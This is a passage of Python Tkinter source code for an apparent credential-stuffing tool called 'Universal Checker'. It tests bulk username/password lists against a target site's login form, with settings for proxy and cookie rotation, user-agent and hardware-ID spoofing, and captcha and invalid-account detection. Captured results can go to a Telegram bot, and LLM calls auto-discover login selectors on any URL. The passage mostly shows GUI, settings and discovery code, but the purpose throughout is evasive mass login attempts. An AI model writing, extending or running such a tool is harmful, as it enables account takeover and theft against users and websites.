    ttk.Label(frame, text="Number of Clicks:").grid(
        column=2, row=0, padx=5, pady=2, sticky="e"
    )
    num_clicks_entry = ttk.Entry(frame, width=10)
    num_clicks_entry.grid(column=3, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        num_clicks_entry,
        "Enter how many times to click this element during one account check.",
    )

    ttk.Label(frame, text="Time Interval (s):").grid(
        column=4, row=0, padx=5, pady=2, sticky="e"
    )
    interval_entry = ttk.Entry(frame, width=10)
    interval_entry.grid(column=5, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        interval_entry, "Enter the interval in seconds between each click."
    )

    remove_button = ttk.Button(
        frame,
        text="-",
        command=lambda f=frame: remove_css_click_action(f),
    )
    remove_button.grid(column=6, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(remove_button, "Remove this CSS click action.")

    # Store references for retrieval
    css_click_frames.append(
        {
            "frame": frame,
            "selector_entry": selector_entry,
            "num_clicks_entry": num_clicks_entry,
            "interval_entry": interval_entry,
        }
    )


def remove_css_click_action(frame):
    """Removes a CSS click action frame."""
    for click_frame in css_click_frames:
        if click_frame["frame"] == frame:
            click_frame["frame"].destroy()
            css_click_frames.remove(click_frame)
            break
    if not css_click_frames:
        add_css_click_action()


# -------------------
# Pause/Resume and Force Stop Functions
# -------------------
def pause_resume():
    """Pauses or resumes the account checking process."""
    if not pause_event.is_set():
        pause_event.set()
        btn_pause_resume.config(text="Resume")
        print_action(f"{Fore.YELLOW}Script paused.{Style.RESET_ALL}")
    else:
        pause_event.clear()
        btn_pause_resume.config(text="Pause")
        print_action(f"{Fore.GREEN}Script resumed.{Style.RESET_ALL}")


def force_stop():
    """Force stops the account checking process."""
    if messagebox.askyesno(
        "Force Stop", "Are you sure you want to force stop the process?"
    ):
        stop_event.set()
        pause_event.clear()
        btn_pause_resume.config(text="Pause")
        print_action(
            f"{Fore.RED}Force stop activated. Stopping all operations...{Style.RESET_ALL}"
        )
        close_browser_instance()
        btn_force_stop.config(state=tk.DISABLED)


# -------------------
# Chromedriver Arguments Functions
# -------------------
def add_chromedriver_argument():
    """Adds a new Chromedriver argument."""
    arg = entry_chromedriver_arg.get().strip()
    if arg and not arg.startswith("--"):
        arg = f"--{arg}"
    if arg:
        chromedriver_args_list.append(arg)
        listbox_chromedriver_args.insert(tk.END, arg)
        entry_chromedriver_arg.delete(0, tk.END)
        print_action(
            f"{Fore.GREEN}Added Chromedriver argument: {arg}{Style.RESET_ALL}"
        )
    else:
        messagebox.showerror("Input Error", "Chromedriver argument cannot be empty.")


def remove_chromedriver_argument():
    """Removes the selected Chromedriver argument."""
    selected_indices = listbox_chromedriver_args.curselection()
    if not selected_indices:
        messagebox.showerror(
            "Selection Error", "Please select an argument to remove."
        )
        return
    for index in selected_indices[::-1]:
        arg = listbox_chromedriver_args.get(index)
        try:
            chromedriver_args_list.remove(arg)
            listbox_chromedriver_args.delete(index)
            print_action(
                f"{Fore.GREEN}Removed Chromedriver argument: {arg}{Style.RESET_ALL}"
            )
        except ValueError:
            print_action(
                f"{Fore.RED}Argument {arg} not found in the list.{Style.RESET_ALL}"
            )


# -------------------
# Profile Selection
# -------------------
def select_profile():
    """Opens a window for selecting a Chrome profile."""
    global profile_name

    def choose_profile():
        """Handles profile selection and closes the window."""
        global profile_name
        selected = profile_list.curselection()
        if selected:
            profile_name_selected = profile_list.get(selected[0])
            profile_name = profile_name_selected
            profile_window.destroy()
            print_action(
                f"{Fore.GREEN}Selected Profile: {profile_name}{Style.RESET_ALL}"
            )
        else:
            messagebox.showerror("Selection Error", "Please select a profile.")

    profile_window = tk.Toplevel(window)
    profile_window.title("Select Chrome Profile")
    profile_window.geometry("600x800")

    # Create a custom style for the button
    select_button_style = ttk.Style()
    select_button_style.configure('SelectProfile.TButton', font=("Helvetica", 12, "bold"), padding=10)

    ttk.Label(profile_window, text="Select a Chrome Profile:").pack(
        padx=10, pady=10
    )

    profile_list = tk.Listbox(profile_window, width=50)
    profile_list.pack(padx=10, pady=10, fill="both", expand=True)

    # Add available profiles from the User Data directory
    try:
        profiles = [
            p
            for p in os.listdir(user_data_dir)
            if os.path.isdir(os.path.join(user_data_dir, p)) and p.startswith("Profile ")
        ]
        if not profiles:
            profiles = ["Default"]
    except Exception as e:
        print_action(
            f"{Fore.RED}Error accessing User Data directory: {e}{Style.RESET_ALL}"
        )
        profiles = ["Default"]

    for profile in profiles:
        profile_list.insert(tk.END, profile)

    select_button = ttk.Button(profile_window, text="Select Profile", command=choose_profile, style='SelectProfile.TButton')
    select_button.pack(padx=10, pady=10)
    CreateToolTip(select_button, "Select the highlighted Chrome profile.")

    # Wait for the profile selection window to be closed
    profile_window.grab_set()
    window.wait_window(profile_window)

    # If no profile selected, default to "Default"
    if not profile_name:
        profile_name = "Default"
        print_action(
            f"{Fore.YELLOW}No profile selected. Defaulting to 'Default'.{Style.RESET_ALL}"
        )


# -------------------
# Save and Load Settings Functions (JSON)
# -------------------
def save_settings():
    """Saves current settings to a file using the json module."""
    settings = {}
    # Collect variables
    settings['var_inner_html_capture'] = var_inner_html_capture.get()
    settings['var_outer_html_capture'] = var_outer_html_capture.get()
    settings['var_cleanup_enabled'] = var_cleanup_enabled.get()
    settings['var_telegram_enabled'] = var_telegram_enabled.get()
    settings['capture_telegram_bot_token'] = capture_telegram_bot_token.get()
    settings['capture_telegram_chat_id'] = capture_telegram_chat_id.get()
    settings['var_proxy_enabled'] = var_proxy_enabled.get()
    settings['var_load_extensions'] = var_load_extensions.get()
    settings['var_disable_notifications'] = var_disable_notifications.get()
    settings['var_disable_infobars'] = var_disable_infobars.get()
    settings['var_start_maximized'] = var_start_maximized.get()
    settings['var_disable_extensions_option'] = var_disable_extensions_option.get()
    settings['var_headless'] = var_headless.get()
    settings['var_custom_user_agents'] = var_custom_user_agents.get()
    settings['var_enable_mouse_clicks'] = var_enable_mouse_clicks.get()
    settings['var_incognito_mode'] = var_incognito_mode.get()
    settings['var_invalid_account_enabled'] = var_invalid_account_enabled.get()
    settings['var_captcha_wrong_enabled'] = var_captcha_wrong_enabled.get()
    settings['var_use_database'] = var_use_database.get()
    settings['var_capture_screenshot'] = var_capture_screenshot.get()
    settings['var_use_same_session'] = var_use_same_session.get()

    # Advanced Stealth Settings
    settings['var_openrouter_keys'] = var_openrouter_keys.get()
    settings['var_openrouter_model'] = var_openrouter_model.get()
    # Claude proxy fallback
    settings['var_claude_proxy_enabled'] = var_claude_proxy_enabled.get()
    settings['var_claude_proxy_url']     = var_claude_proxy_url.get()
    settings['var_claude_proxy_model']   = var_claude_proxy_model.get()
    settings['var_proxy_list_path'] = var_proxy_list_path.get()
    settings['var_cookie_list_path'] = var_cookie_list_path.get()
    settings['var_isolation'] = var_isolation.get()
    settings['var_developer_mode'] = var_developer_mode.get()
    settings['var_jitter'] = var_jitter.get()
    settings['var_reinstall'] = var_reinstall.get()
    settings['var_hwid_spoof'] = var_hwid_spoof.get()
    # Log Ingestion Engine settings
    settings['var_log_ingestion_enabled'] = var_log_ingestion_enabled.get()
    settings['var_log_ingestion_isolate']  = var_log_ingestion_isolate.get()
    # Entries
    settings['entry_website_target_link'] = entry_website_target_link.get()
    settings['entry_website_valid_link'] = entry_website_valid_link.get()
    settings['entry_redirect_link'] = entry_redirect_link.get()
    settings['entry_css_selector_email'] = entry_css_selector_email.get()
    settings['entry_css_selector_password'] = entry_css_selector_password.get()
    settings['entry_css_selector_submit'] = entry_css_selector_submit.get()
    settings['entry_css_selector_next_button'] = entry_css_selector_next_button.get()
    settings['entry_css_selector_next_button_password'] = entry_css_selector_next_button_password.get()
    settings['entry_sleep_email'] = entry_sleep_email.get()
    settings['entry_sleep_password'] = entry_sleep_password.get()
    settings['entry_sleep_submit'] = entry_sleep_submit.get()
    settings['entry_invalid_redirect'] = entry_invalid_redirect.get()
    settings['entry_invalid_error_selector'] = entry_invalid_error_selector.get()
    settings['entry_invalid_inner_html'] = entry_invalid_inner_html.get()
    settings['entry_invalid_outer_html'] = entry_invalid_outer_html.get()
    settings['entry_captcha_redirect'] = entry_captcha_redirect.get()
    settings['entry_captcha_error_selector'] = entry_captcha_error_selector.get()
    settings['entry_captcha_inner_html'] = entry_captcha_inner_html.get()
    settings['entry_captcha_outer_html'] = entry_captcha_outer_html.get()
    # Capture CSS Selectors
    settings['capture_css_selector_frames'] = []
    for frame in capture_css_selector_frames:
        key = frame['key_entry'].get()
        selector = frame['selector_entry'].get()
        settings['capture_css_selector_frames'].append({'key': key, 'selector': selector})
    # Mouse Click Frames
    settings['mouse_click_frames'] = []
    for frame in mouse_click_frames:
        x = frame['x_entry'].get()
        y = frame['y_entry'].get()
        num_clicks = frame['num_clicks_entry'].get()
        interval = frame['interval_entry'].get()
        settings['mouse_click_frames'].append({'x': x, 'y': y, 'num_clicks': num_clicks, 'interval': interval})
    # CSS Click Frames
    settings['css_click_frames'] = []
    for frame in css_click_frames:
        selector = frame['selector_entry'].get()
        num_clicks = frame['num_clicks_entry'].get()
        interval = frame['interval_entry'].get()
        settings['css_click_frames'].append({'selector': selector, 'num_clicks': num_clicks, 'interval': interval})
    # Chromedriver Arguments
    settings['chromedriver_args_list'] = chromedriver_args_list
    # Account Inputs (Text widget — saved as a plain string, stripped to avoid
    # a trailing newline that Tkinter always appends via get("1.0", END))
    settings['text_usernames_passwords'] = text_usernames_passwords.get("1.0", tk.END).rstrip("\n")
    
    # Sync Draggable Steps entry values
    global fields_sequence
    if 'field_manager' in globals() and field_manager:
        for block in field_manager.blocks:
            field_id = block.field_id
            for f in fields_sequence:
                if f["id"] == field_id:
                    if hasattr(block, "sel_entry"):
                        f["selector"] = block.sel_entry.get().strip()
                    if hasattr(block, "val_entry"):
                        f["value"] = block.val_entry.get().strip()
    settings['fields_sequence'] = fields_sequence
    settings['colors'] = colors
    
    # =========================================================================
    # ATOMIC WRITE WITH BACKUP ROTATION (2026-06-04)
    # Old pattern: open('wb') truncates the file BEFORE writing. If the app
    # crashes mid-write, settings.json is 0 bytes → all settings gone forever.
    #
    # New pattern:
    #   1. Write to settings.json.tmp (new temp file, never touches the original)
    #   2. Rename current settings.json → settings.json.bak (backup)
    #   3. Atomic rename settings.json.tmp → settings.json
    #
    # At ALL times, at least one complete copy exists on disk.
    # =========================================================================
    import tempfile as _tempfile_mod
    _settings_dir = os.path.dirname(settings_file)
    if not os.path.isdir(_settings_dir):
        os.makedirs(_settings_dir, exist_ok=True)
    _fd = None
    _tmp_path = None
    try:
        _fd, _tmp_path = _tempfile_mod.mkstemp(dir=_settings_dir, suffix='.json.tmp')
        with os.fdopen(_fd, 'w', encoding='utf-8') as _tmp_f:
            from engine.kernel.math_engine.crypto import encrypt_string
            json_str = json.dumps(settings, indent=4)
            encrypted_str = encrypt_string(json_str)
            _tmp_f.write(encrypted_str)
            _tmp_f.flush()
            os.fsync(_tmp_f.fileno())  # Force OS to flush to disk
        _fd = None  # os.fdopen took ownership, don't close again
        # Backup the current settings file (if it exists)
        _bak_path = settings_file + '.bak'
        if os.path.isfile(settings_file):
            try:
                os.replace(settings_file, _bak_path)
            except OSError as _bak_err:
                print_action(f"{Fore.YELLOW}Warning: Could not create settings backup: {_bak_err}{Style.RESET_ALL}")
        # Atomic rename: tmp → settings.json
        os.replace(_tmp_path, settings_file)
        _tmp_path = None  # Successfully renamed, don't clean up
        print_action(f"{Fore.GREEN}Settings saved to {settings_file}.{Style.RESET_ALL}")
    except Exception as _save_exc:
        print_action(f"{Fore.RED}ERROR saving settings: {_save_exc}{Style.RESET_ALL}")
        # Clean up temp file if it still exists
        if _tmp_path and os.path.isfile(_tmp_path):
            try:
                os.unlink(_tmp_path)
            except OSError:
                pass
        raise


def load_settings():
    """Loads settings from a file using the json module.
    
    Falls back to the .bak backup file if the main settings file is
    corrupt (e.g. truncated by a crash during a previous save).
    """
    _bak_path = settings_file + '.bak'
    _loaded_from_backup = False
    
    def _try_load(path):
        """Attempt to load settings from a given path using json."""
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
        from engine.kernel.math_engine.crypto import decrypt_string
        decrypted_content = decrypt_string(content)
        data = json.loads(decrypted_content)
        if not isinstance(data, dict):
            raise ValueError(f"Expected dict, got {type(data).__name__}")
        return data
    
    settings = None
    try:
        settings = _try_load(settings_file)
    except FileNotFoundError:
        # Main file doesn't exist — try backup
        try:
            settings = _try_load(_bak_path)
            _loaded_from_backup = True
            print_action(f"{Fore.YELLOW}Main settings file not found — restored from backup.{Style.RESET_ALL}")
        except FileNotFoundError:
            print_action(f"{Fore.YELLOW}No settings file found. Starting with default settings.{Style.RESET_ALL}")
            return
        except Exception as _bak_err:
            print_action(f"{Fore.RED}Backup settings also corrupt: {_bak_err}. Starting with defaults.{Style.RESET_ALL}")
            return
    except Exception as _main_err:
        print_action(f"{Fore.RED}Main settings file corrupt: {_main_err}{Style.RESET_ALL}")
        # Main file exists but is corrupt — try backup
        try:
            settings = _try_load(_bak_path)
            _loaded_from_backup = True
            print_action(f"{Fore.GREEN}Successfully restored settings from backup file!{Style.RESET_ALL}")
        except Exception as _bak_err2:
            print_action(f"{Fore.RED}Backup also corrupt: {_bak_err2}. Starting with defaults.{Style.RESET_ALL}")
            return
    
    if settings is None:
        return
    
    try:
        # Set variables
        var_inner_html_capture.set(settings.get('var_inner_html_capture', False))
        var_outer_html_capture.set(settings.get('var_outer_html_capture', False))
        var_cleanup_enabled.set(settings.get('var_cleanup_enabled', True))
        var_telegram_enabled.set(settings.get('var_telegram_enabled', False))
        capture_telegram_bot_token.set(settings.get('capture_telegram_bot_token', ''))
        capture_telegram_chat_id.set(settings.get('capture_telegram_chat_id', ''))
        var_proxy_enabled.set(settings.get('var_proxy_enabled', False))
        var_dynamic_proxy_enabled.set(settings.get('var_dynamic_proxy_enabled', False))
        var_proxy_source_url.set(settings.get('var_proxy_source_url', ''))
        try:
            var_proxy_fetch_interval.set(settings.get('var_proxy_fetch_interval', 60))
        except Exception:
            var_proxy_fetch_interval.set(60)
        var_load_extensions.set(settings.get('var_load_extensions', False))
        var_disable_notifications.set(settings.get('var_disable_notifications', False))
        var_disable_infobars.set(settings.get('var_disable_infobars', False))
        var_start_maximized.set(settings.get('var_start_maximized', False))
        var_disable_extensions_option.set(settings.get('var_disable_extensions_option', False))
        var_headless.set(settings.get('var_headless', False))
        var_custom_user_agents.set(settings.get('var_custom_user_agents', False))
        var_enable_mouse_clicks.set(settings.get('var_enable_mouse_clicks', False))
        var_incognito_mode.set(settings.get('var_incognito_mode', False))
        var_invalid_account_enabled.set(settings.get('var_invalid_account_enabled', False))
        var_captcha_wrong_enabled.set(settings.get('var_captcha_wrong_enabled', False))
        var_use_database.set(settings.get('var_use_database', True))
        var_capture_screenshot.set(settings.get('var_capture_screenshot', True))
        var_use_same_session.set(settings.get('var_use_same_session', False))

        # Advanced Stealth Settings
        var_openrouter_keys.set(settings.get('var_openrouter_keys', ''))
        # Use the current priority default free model, not gpt-3.5-turbo which is paid
        var_openrouter_model.set(settings.get('var_openrouter_model', 'google/gemini-2.0-flash-lite-preview-02-05:free'))
        # Claude proxy fallback
        var_claude_proxy_enabled.set(settings.get('var_claude_proxy_enabled', False))
        var_claude_proxy_url.set(settings.get('var_claude_proxy_url', 'http://localhost:8080'))
        _saved_model = settings.get('var_claude_proxy_model', 'gemini-3-flash')
        # Migrate: strip the legacy [1m] suffix that was never a valid model ID
        if '[' in _saved_model:
            _saved_model = _saved_model.split('[')[0]
        var_claude_proxy_model.set(_saved_model)
        var_proxy_list_path.set(settings.get('var_proxy_list_path', ''))
        var_cookie_list_path.set(settings.get('var_cookie_list_path', ''))
        var_isolation.set(settings.get('var_isolation', True))
        var_developer_mode.set(settings.get('var_developer_mode', True))
        var_jitter.set(settings.get('var_jitter', False))
        var_reinstall.set(settings.get('var_reinstall', False))
        var_hwid_spoof.set(settings.get('var_hwid_spoof', False))
        # Log Ingestion Engine settings
        var_log_ingestion_enabled.set(settings.get('var_log_ingestion_enabled', False))
        var_log_ingestion_isolate.set(settings.get('var_log_ingestion_isolate', True))

        # Set entries
        entry_website_target_link.delete(0, tk.END)
        entry_website_target_link.insert(0, settings.get('entry_website_target_link', ''))

        entry_website_valid_link.delete(0, tk.END)
        entry_website_valid_link.insert(0, settings.get('entry_website_valid_link', ''))

        entry_redirect_link.delete(0, tk.END)
        entry_redirect_link.insert(0, settings.get('entry_redirect_link', ''))

        entry_css_selector_email.delete(0, tk.END)
        entry_css_selector_email.insert(0, settings.get('entry_css_selector_email', ''))

        entry_css_selector_password.delete(0, tk.END)
        entry_css_selector_password.insert(0, settings.get('entry_css_selector_password', ''))

        entry_css_selector_submit.delete(0, tk.END)
        entry_css_selector_submit.insert(0, settings.get('entry_css_selector_submit', ''))

        entry_css_selector_next_button.delete(0, tk.END)
        entry_css_selector_next_button.insert(0, settings.get('entry_css_selector_next_button', ''))

        entry_css_selector_next_button_password.delete(0, tk.END)
        entry_css_selector_next_button_password.insert(0, settings.get('entry_css_selector_next_button_password', ''))

        entry_sleep_email.delete(0, tk.END)
        entry_sleep_email.insert(0, settings.get('entry_sleep_email', '25'))

        entry_sleep_password.delete(0, tk.END)
        entry_sleep_password.insert(0, settings.get('entry_sleep_password', '25'))

        entry_sleep_submit.delete(0, tk.END)
        entry_sleep_submit.insert(0, settings.get('entry_sleep_submit', '25'))

        entry_invalid_redirect.delete(0, tk.END)
        entry_invalid_redirect.insert(0, settings.get('entry_invalid_redirect', ''))

        entry_invalid_error_selector.delete(0, tk.END)
        entry_invalid_error_selector.insert(0, settings.get('entry_invalid_error_selector', ''))

        entry_invalid_inner_html.delete(0, tk.END)
        entry_invalid_inner_html.insert(0, settings.get('entry_invalid_inner_html', ''))

        entry_invalid_outer_html.delete(0, tk.END)
        entry_invalid_outer_html.insert(0, settings.get('entry_invalid_outer_html', ''))

        entry_captcha_redirect.delete(0, tk.END)
        entry_captcha_redirect.insert(0, settings.get('entry_captcha_redirect', ''))

        entry_captcha_error_selector.delete(0, tk.END)
        entry_captcha_error_selector.insert(0, settings.get('entry_captcha_error_selector', ''))

        entry_captcha_inner_html.delete(0, tk.END)
        entry_captcha_inner_html.insert(0, settings.get('entry_captcha_inner_html', ''))

        entry_captcha_outer_html.delete(0, tk.END)
        entry_captcha_outer_html.insert(0, settings.get('entry_captcha_outer_html', ''))

        # Load capture CSS selectors
        for frame in capture_css_selector_frames:
            frame['frame'].destroy()
        capture_css_selector_frames.clear()
        for item in settings.get('capture_css_selector_frames', []):
            add_capture_css_selector_frame(key=item['key'], selector=item['selector'], load=True)
        # Load mouse click frames
        for frame in mouse_click_frames:
            frame['frame'].destroy()
        mouse_click_frames.clear()
        for item in settings.get('mouse_click_frames', []):
            add_mouse_click_action_extended()
            frame = mouse_click_frames[-1]
            frame['x_entry'].insert(0, item['x'])
            frame['y_entry'].insert(0, item['y'])
            frame['num_clicks_entry'].insert(0, item['num_clicks'])
            frame['interval_entry'].insert(0, item['interval'])
        # Load CSS click frames
        for frame in css_click_frames:
            frame['frame'].destroy()
        css_click_frames.clear()
        for item in settings.get('css_click_frames', []):
            add_css_click_action()
            frame = css_click_frames[-1]
            frame['selector_entry'].insert(0, item['selector'])
            frame['num_clicks_entry'].insert(0, item['num_clicks'])
            frame['interval_entry'].insert(0, item['interval'])
        # Load chromedriver arguments
        chromedriver_args_list.clear()
        chromedriver_args_list.extend(settings.get('chromedriver_args_list', []))
        listbox_chromedriver_args.delete(0, tk.END)
        for arg in chromedriver_args_list:
            listbox_chromedriver_args.insert(tk.END, arg)
        # Account Inputs — restore last-used accounts into the Text widget
        _saved_accounts = settings.get('text_usernames_passwords', '')
        if _saved_accounts:
            text_usernames_passwords.delete("1.0", tk.END)
            text_usernames_passwords.insert("1.0", _saved_accounts)
            
        # Restore fields sequence and rebuild DND manager
        global fields_sequence
        loaded_seq = settings.get('fields_sequence', None)
        if loaded_seq:
            fields_sequence = loaded_seq
            if 'field_manager' in globals() and field_manager:
                field_manager.fields_data = fields_sequence
                field_manager.rebuild_ui()
                
        # Restore customized color palette
        loaded_colors = settings.get('colors', None)
        if loaded_colors:
            apply_color_palette(loaded_colors)
                
        print_action(f"{Fore.GREEN}Settings loaded from {settings_file}.{Style.RESET_ALL}")
    except Exception as e:
        print_action(f"{Fore.RED}Error applying loaded settings: {e}{Style.RESET_ALL}")
    
    if _loaded_from_backup:
        # Immediately re-save so the main settings.json is repaired from the backup
        try:
            save_settings()
            print_action(f"{Fore.GREEN}Settings auto-repaired from backup → main file restored.{Style.RESET_ALL}")
        except Exception:
            pass


def handle_auto_discovery():
    """
    Handle the automated field discovery in a background daemon thread.
    Supports either standard CrewAI squad or Rust Agent-Browser learning loop.
    """
    target_url = entry_website_target_link.get().strip()
    if not target_url or target_url == "Enter value here...":
        messagebox.showwarning("Input Required", "Please enter a Target Website URL first.")
        return

    # Determine mode
    mode = "✨ Standard (AI Crew)"
    try:
        if 'combo_discover_mode' in globals():
            mode = combo_discover_mode.get()
    except Exception:
        pass

    # Snapshot API keys from GUI now (before background thread)
    raw_keys = var_openrouter_keys.get().strip()
    api_keys = [k.strip() for k in raw_keys.split(",") if k.strip()]
    preferred_model = var_openrouter_model.get().strip()

    # Snapshot Claude proxy settings
    claude_proxy_enabled = var_claude_proxy_enabled.get()
    claude_proxy_url_val  = var_claude_proxy_url.get().strip() if claude_proxy_enabled else ""
    claude_proxy_model_val = var_claude_proxy_model.get().strip()

    if not api_keys and not claude_proxy_url_val:
        messagebox.showerror(
            "Configuration Required",
            "No OpenRouter API key(s) found and Claude proxy is not enabled.\n"
            "Please add at least one key in the Stealth tab → 'OpenRouter API Key(s)' field,\n"
            "or enable the Claude proxy fallback in the Stealth tab."
        )
        return

    def update_selectors(res: dict):
        """Apply validated discovery results to GUI entries."""
        _FIELD_ENTRY_MAP = {
            "email_field": entry_css_selector_email,
            "password_field": entry_css_selector_password,
            "submit_button": entry_css_selector_submit,
            "next_button": entry_css_selector_next_button,
            "invalid_error_selector": entry_invalid_error_selector,
            "invalid_inner_html": entry_invalid_inner_html,
            "invalid_outer_html": entry_invalid_outer_html,
            "captcha_error_selector": entry_captcha_error_selector,
            "captcha_inner_html": entry_captcha_inner_html,
            "captcha_outer_html": entry_captcha_outer_html,
        }
        for field_key, entry_widget in _FIELD_ENTRY_MAP.items():
            value = res.get(field_key)
            if value is not None and value != "":
                entry_widget.delete(0, tk.END)
                entry_widget.insert(0, value)
                entry_widget.config(foreground=colors["fg"])
                
        # Automatically toggle the checkboxes to True if we discovered corresponding values!
        if res.get("invalid_error_selector") or res.get("invalid_inner_html") or res.get("invalid_outer_html"):
            var_invalid_account_enabled.set(True)
        if res.get("captcha_error_selector") or res.get("captcha_inner_html") or res.get("captcha_outer_html"):
            var_captcha_wrong_enabled.set(True)
            
        messagebox.showinfo("Discovery Success", "Fields and error alerts have been automatically detected and populated!")

    def open_rust_discovery_credentials_dialog(target_url):
        """Spawns a custom dialog modal to collect username and password for test round."""
        credentials = {"email": "", "password": "", "start": False}
        
        dialog = tk.Toplevel(window)
        dialog.title("🤖 Rust Browser Credentials")
        dialog.geometry("500x380")
        dialog.configure(bg=colors["bg"])
        dialog.resizable(False, False)
        dialog.grab_set()
        
        # Center the dialog on screen
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() - dialog.winfo_width()) // 2
        y = (dialog.winfo_screenheight() - dialog.winfo_height()) // 2
        dialog.geometry(f"+{x}+{y}")
        
        # Title
        lbl_title = tk.Label(
            dialog,
            text="🤖 RUST BROWSER LEARNING CREDENTIALS",
            font=("Inter", 11, "bold"),
            fg=colors["accent"],
            bg=colors["bg"]
        )
        lbl_title.pack(pady=(20, 10))
        
        # Description
        lbl_desc = tk.Label(
            dialog,
            text=(
                "To automatically discover exact CSS selectors, multi-step transition\n"
                "buttons, and error boxes, the Rust agent needs a valid test account.\n"
                "It will perform a live test round to learn the DOM elements."
            ),
            font=("Inter", 9),
            fg=colors["fg_sub"],
            bg=colors["bg"],
            justify="center"
        )
        lbl_desc.pack(pady=(0, 15))
        
        # Container frame
        frm_fields = tk.Frame(dialog, bg=colors["surface"], bd=1, relief="solid", highlightthickness=0)
        frm_fields.pack(fill="x", padx=30, pady=10, ipady=15)
        
        # Email label & Entry
        lbl_email = tk.Label(
            frm_fields,
            text="Test Email / Username:",
            font=("Inter", 9, "bold"),
            fg=colors["fg"],
            bg=colors["surface"],
            anchor="w"
        )
        lbl_email.pack(fill="x", padx=20, pady=(15, 2))
        
        entry_email = ttk.Entry(frm_fields, width=40)
        entry_email.pack(fill="x", padx=20, pady=2)
        entry_email.insert(0, "test@example.com")
        
        # Password label & Entry
        lbl_pass = tk.Label(
            frm_fields,
            text="Test Password:",
            font=("Inter", 9, "bold"),
            fg=colors["fg"],
            bg=colors["surface"],
            anchor="w"
        )
        lbl_pass.pack(fill="x", padx=20, pady=(10, 2))
        
        entry_pass = ttk.Entry(frm_fields, width=40, show="*")
        entry_pass.pack(fill="x", padx=20, pady=2)
        entry_pass.insert(0, "password123")
        
        # Button Frame
        frm_btns = tk.Frame(dialog, bg=colors["bg"])
        frm_btns.pack(pady=20)
        
        def on_start():
            credentials["email"] = entry_email.get().strip()
            credentials["password"] = entry_pass.get().strip()
            if not credentials["email"] or not credentials["password"]:
                messagebox.showwarning("Input Required", "Please enter both email and password.")
                return
            credentials["start"] = True
            dialog.destroy()
            
        def on_cancel():
            dialog.destroy()
            
        btn_start = ttk.Button(frm_btns, text="🚀 Start Learning Loop", command=on_start)
        btn_start.pack(side="left", padx=10)
        
        btn_cancel = ttk.Button(frm_btns, text="Cancel", command=on_cancel)
        btn_cancel.pack(side="left", padx=10)
        
        window.wait_window(dialog)
        return credentials

    def ask_ai_agent(prompt):
        """Thread-safe helper that sends prompt payloads directly to OpenRouter or Claude proxy."""
        import json
        import requests
        
        # Fallback to local claude proxy if enabled
        if claude_proxy_enabled and claude_proxy_url_val:
            try:
                url = claude_proxy_url_val
                if not url.endswith("/chat/completions") and not url.endswith("/v1/chat/completions"):
                    url = url.rstrip("/") + "/v1/chat/completions"
                
                headers = {"Content-Type": "application/json"}
                payload = {
                    "model": claude_proxy_model_val or "claude-3-5-sonnet",
                    "messages": [{"role": "user", "content": prompt}],
                    "temperature": 0.1
                }
                response = requests.post(url, json=payload, headers=headers, timeout=30)
                if response.status_code == 200:
                    res_data = response.json()
                    content = res_data["choices"][0]["message"]["content"]
                    if "```json" in content:
                        content = content.split("```json")[1].split("```")[0].strip()
                    elif "```" in content:
                        content = content.split("```")[1].split("```")[0].strip()
                    return json.loads(content.strip())
            except Exception as e:
                print_action(f"{Fore.YELLOW}Claude proxy query failed, trying OpenRouter fallback: {e}{Style.RESET_ALL}")
                
        # Try OpenRouter keys in list
        errors = []
        for api_key in api_keys:
            try:
                url = "https://openrouter.ai/api/v1/chat/completions"
                headers = {
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json",
                    "HTTP-Referer": "https://github.com/usemanusai/UC",
                    "X-Title": "Universal Checker"
                }
                payload = {
                    "model": preferred_model or "anthropic/claude-3.5-sonnet",
                    "messages": [{"role": "user", "content": prompt}],
                    "temperature": 0.1,
                    "response_format": {"type": "json_object"}
                }
                response = requests.post(url, json=payload, headers=headers, timeout=30)
                if response.status_code == 200:
                    res_data = response.json()
                    content = res_data["choices"][0]["message"]["content"]
                    if "```json" in content:
                        content = content.split("```json")[1].split("```")[0].strip()
                    elif "```" in content:
                        content = content.split("```")[1].split("```")[0].strip()
                    return json.loads(content.strip())
                else:
                    errors.append(f"OpenRouter API {response.status_code}: {response.text}")
            except Exception as e:
                errors.append(str(e))
                
        raise RuntimeError(f"AI matching failed. Errors: {'; '.join(errors)}")

    def run_agent_browser(args):
        """Safely execute npx agent-browser commands inside a subprocess on Windows 11 using pwsh.
        
        agent-browser uses daemon architecture: each command launches, talks to the
        daemon (which holds the browser session), and exits. Commands are chained
        with && in a single shell call so the browser persists between them.
        
        IMPORTANT: There is NO 'batch' subcommand in agent-browser. The correct
        approach is to chain commands with && in the shell.
        """
        import subprocess
        
        # Clean up and normalise command args (remove redundant prefixes)
        clean_args = []
        skip_next = False
        for i, arg in enumerate(args):
            if skip_next:
                skip_next = False
                continue
            if arg == "npx":
                if i + 1 < len(args) and args[i+1] == "-y":
                    skip_next = True
                continue
            if arg == "agent-browser":
                continue
            clean_args.append(arg)
            
        # If the clean_args is just ["install"] or ["close", "--all"], we don't need chain partition
        if clean_args and clean_args[0] in ["install", "close"]:
            cmd_str = " ".join("'" + a.replace("'", "''") + "'" for a in clean_args)
            pwsh_cmd = f"npx -y agent-browser {cmd_str}"
        else:
            # Parse out global options and command/batch args
            global_flags = []
            cmd_args = []
            
            i = 0
            while i < len(clean_args):
                arg = clean_args[i]
                if arg in {"--session", "--timeout", "--cdp", "--extension"}:
                    # These take a value
                    if i + 1 < len(clean_args):
                        global_flags.append(arg)
                        global_flags.append(clean_args[i+1])
                        i += 2
                    else:
                        global_flags.append(arg)
                        i += 1
                elif arg in {"--headed", "--headless", "--json", "--full"}:
                    # These are standalone global flags
                    global_flags.append(arg)
                    i += 1
                elif arg == "--args":
                    # SKIP: --args is NOT a valid agent-browser flag.
                    # Chrome args are passed via environment or config, not CLI.
                    if i + 1 < len(clean_args):
                        i += 2  # Skip --args and its value
                    else:
                        i += 1
                elif arg == "batch":
                    # SKIP: 'batch' is NOT a valid agent-browser command.
                    # Commands are chained with && instead.
                    i += 1
                else:
                    # This is a command or command argument
                    cmd_args.append(arg)
                    i += 1
                    
            # Global flags go directly after 'agent-browser'
            global_str = " ".join(global_flags)
            
            # Each element in cmd_args is already a complete subcommand string
            # (e.g. "open https://example.com", "wait 3000", "snapshot")
            # Chain them with && so agent-browser daemon keeps the session alive
